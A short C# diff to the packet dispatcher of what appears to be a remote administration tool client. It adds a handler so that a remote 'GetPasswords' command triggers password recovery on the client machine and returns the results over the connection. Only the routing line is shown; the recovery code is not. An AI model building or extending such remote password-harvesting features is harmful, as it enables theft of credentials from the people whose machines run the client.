@@ -73,6 +73,10 @@ namespace Client.Packets
             {
                 StartupManagerController.doStartupItemRemove((DoStartupItemRemove)packet, client);
             }
+            else if (type == TypePackets.GetPasswords)
+            {
+                PasswordRecoveryController.getPasswords((GetPasswords)packet, client);
+            }
         }
     }
 }
